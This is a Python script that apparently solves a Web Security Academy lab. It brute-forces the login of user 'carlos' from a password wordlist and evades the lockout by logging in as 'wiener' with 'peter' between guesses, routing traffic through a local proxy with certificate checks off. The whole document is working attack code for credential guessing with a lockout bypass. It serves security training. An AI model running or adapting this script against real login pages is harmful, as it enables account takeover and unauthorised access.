import requests
from warnings import filterwarnings
filterwarnings('ignore')

url = "https://0a6900af03fd7780c07b798d0097009c.web-security-academy.net/login"
cookie = {"session": "mI5hgPlQhOCpVQjxQ7heGABeThUOJKvX"}
data = {"productId": 1, "quantity": 99, "redir": "CART"}
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

s = requests.Session()


with open('../payloads/passwords.txt') as f:
    passwords = f.readlines()

not_found = True

while not_found:
    for password in passwords:
        password = password.strip()
        for name in ['wiener', 'carlos']:
            if name == 'wiener':
                pwd = 'peter'
                print(f'{name} -> {pwd}')
                data = {'username': 'wiener', 'password': 'peter'}
                r = s.post(url, data=data, cookies=cookie, allow_redirects=False,
                           proxies=proxies, verify=False)
                print(r.status_code)
            else:
                pwd = password
                print(f'{name} -> {pwd}')
                data = {'username': 'carlos', 'password': pwd}
                r = s.post(url, data=data, cookies=cookie, allow_redirects=False,
                           proxies=proxies, verify=False)
                print(r.status_code)
                if r.status_code == 302:
                    not_found = False
    not_found = False
